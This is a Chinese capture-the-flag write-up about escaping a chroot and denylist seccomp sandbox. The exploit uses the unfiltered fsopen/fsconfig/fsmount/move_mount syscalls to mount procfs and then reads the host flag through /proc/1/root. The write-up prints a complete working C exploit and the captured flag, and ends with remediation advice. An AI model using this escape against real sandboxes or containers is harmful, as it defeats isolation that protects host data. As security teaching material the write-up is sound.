# Young Man esCApe

## 题目简述

服务在 QEMU Guest 中把用户程序限制在 chroot，并加载一份仿照容器加固建议编写的 seccomp 过滤器。过滤器禁止了 `mount`、`chroot`、`pivot_root`、`unshare`、`kexec_*`、内核模块和 io_uring 等大量危险系统调用，然后接收十六进制编码的静态 ELF 并执行。

漏洞不在内存破坏，而在系统调用策略不完整：黑名单漏掉了 fd-based mount API 的 `fsopen`、`fsconfig`、`fsmount` 与 `move_mount`。受限进程仍是拥有 `CAP_SYS_ADMIN` 的 Guest root，因此可以用这四个系统调用挂载 procfs，再通过 `/proc/1/root` 访问 chroot 外的真实根目录。

## 解题过程

### 1. 审计 seccomp 的默认行为

题目过滤器的逻辑是：

```c
int syscalls[] = {
    __NR_chroot, __NR_mount, __NR_unshare, __NR_reboot,
    __NR_ptrace, __NR_open_by_handle_at, __NR_pivot_root,
    __NR_init_module, __NR_finit_module,
    __NR_kexec_load, __NR_kexec_file_load,
    __NR_io_uring_setup, __NR_io_uring_enter, __NR_io_uring_register,
    /* 其余黑名单项 */
};

/* 命中任一黑名单项则 SECCOMP_RET_KILL；否则 SECCOMP_RET_ALLOW。 */
```

决定安全性的不是“列了多少危险调用”，而是未命中的默认动作。这里默认允许，所以任何新增、别名或功能等价但未枚举的 syscall 都能绕过策略。

题面引用的 [Docker seccomp 文档](https://docs.docker.com/engine/security/seccomp/) 明确说明 Docker 默认配置本质上是 allowlist：默认返回 `SCMP_ACT_ERRNO`，只对列出的调用改为 `SCMP_ACT_ALLOW`。外链的重要结论是默认拒绝模型及“不建议修改默认 profile”，并不是复制文档中的显著危险调用表便可得到同等保护。本题源码实现的是自定义 denylist，不能称为“完整使用 Docker 默认 profile”。

### 2. 找到功能等价的新挂载接口

Linux 的新挂载 API 把一次 `mount()` 拆成若干基于文件描述符的步骤：

```text
fsopen("proc")
  → fsconfig(..., FSCONFIG_CMD_CREATE, ...)
  → fsmount(...)
  → move_mount(..., "/mnt", ...)
```

[fsopen(2)](https://man7.org/linux/man-pages/man2/fsopen.2.html) 给出的标准工作流正是：创建文件系统上下文、用 `fsconfig` 实例化、用 `fsmount` 得到 detached mount object，再用 `move_mount` 挂到路径。它在权限上仍要求 `CAP_SYS_ADMIN`，并不是无权限挂载漏洞；本题的问题是 seccomp 漏放且进程没有被剥夺该能力。

附件对应的 x86-64 syscall 号为：

```text
move_mount = 429
fsopen     = 430
fsconfig   = 431
fsmount    = 432
```

这些调用都不在 `sandbox.c` 的黑名单中。

### 3. 在 chroot 内挂载 procfs

官方 solver 的核心逻辑可以整理为：

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef SYS_move_mount
#define SYS_move_mount 429
#define SYS_fsopen     430
#define SYS_fsconfig   431
#define SYS_fsmount    432
#endif

static int xfsopen(const char *name, unsigned flags) {
    return syscall(SYS_fsopen, name, flags);
}

static int xfsconfig(int fd, unsigned cmd,
                     const char *key, const void *value, int aux) {
    return syscall(SYS_fsconfig, fd, cmd, key, value, aux);
}

static int xfsmount(int fd, unsigned flags, unsigned attrs) {
    return syscall(SYS_fsmount, fd, flags, attrs);
}

static int xmove_mount(int from_fd, const char *from,
                       int to_fd, const char *to, unsigned flags) {
    return syscall(SYS_move_mount, from_fd, from, to_fd, to, flags);
}

int main(void) {
    int fsfd = xfsopen("proc", FSOPEN_CLOEXEC);
    if (fsfd < 0)
        return 1;

    if (xfsconfig(fsfd, FSCONFIG_CMD_CREATE, NULL, NULL, 0) < 0)
        return 2;

    int mfd = xfsmount(fsfd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);
    close(fsfd);
    if (mfd < 0)
        return 3;

    mkdir("/mnt", 0777);
    if (xmove_mount(mfd, "", AT_FDCWD, "/mnt",
                    MOVE_MOUNT_F_EMPTY_PATH) < 0)
        return 4;
    close(mfd);

    int fd = open("/mnt/1/root/flag", O_RDONLY);
    if (fd < 0)
        return 5;

    char buf[100];
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n > 0)
        write(STDOUT_FILENO, buf, n);
    close(fd);
    return 0;
}
```

`fsmount` 返回一个尚未挂到目录树的 mount fd；`MOVE_MOUNT_F_EMPTY_PATH` 表示直接把 `from_fd` 引用的 detached mount 接到 `/mnt`。这一过程没有调用被拦截的传统 `mount()`。

### 4. 通过 `/proc/1/root` 越过 chroot

chroot 只改变当前进程解析绝对路径时使用的根目录，不会创建新的 PID namespace，也不会隐藏内核中的其他进程。新挂载的 procfs 因而可以看到 Guest 的 PID 1，而：

```text
/proc/1/root
```

是指向 PID 1 根目录的魔法链接。PID 1 没有进入用户程序的 chroot，所以 `/mnt/1/root/flag` 实际解析到 Guest 真实根目录的 `/flag`。读取结果为：

```text
ACTF{n3vEr_u5e_d3n$1lsT_0n1y_!n_secc0mp}
```

服务要求上传静态 ELF，因为 chroot 内没有可依赖的动态加载器和共享库。官方 solver 自行实现 syscall 包装，经过 `-nodefaultlibs`、裁剪汇编、`ld -N`、`strip` 与 `sstrip` 后得到 848 字节 ELF；客户端分块发送文件的十六进制文本，并以空行结束。上传脚本原本会直接 `os.popen()` 执行服务端显示的整条 PoW 命令，这种写法不适合不可信服务；更安全的实现应只解析 26 位难度和资源串，再调用固定的 `hashcash` 参数。

## 方法总结

本题说明 denylist 无法可靠表达“禁止挂载”：传统 `mount` 被拆分为新 syscall 后，旧列表没有自动获得等价覆盖。利用链是保留的 `CAP_SYS_ADMIN` 加四个漏放的 mount syscall，再借 procfs 的 `/proc/1/root` 穿过 chroot。

修复不能只补上这四个名字。更稳妥的方案是默认拒绝、按业务最小化允许 syscall，同时去掉 `CAP_SYS_ADMIN`，使用独立的 user、mount 与 PID namespace，并避免把敏感文件放在同一可达内核实例的根文件系统中。seccomp、capability、namespace 和 chroot 是不同隔离层，任何一层都不应被误当作完整沙箱。
